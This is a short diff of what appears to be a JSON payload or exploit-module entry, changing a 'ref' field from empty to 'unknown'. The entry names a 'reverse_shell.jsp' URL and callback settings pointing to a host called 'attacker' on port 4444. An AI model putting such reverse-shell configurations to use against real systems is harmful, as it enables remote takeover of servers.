@@ -32,6 +32,6 @@
     "os"    : "any",
     "conf"  : {"host": "attacker", "port": 4444},
     "url"   : "http://host/reverse_shell.jsp",
-    "ref"   : []
+    "ref"   : ["unknown"]
   }
 }
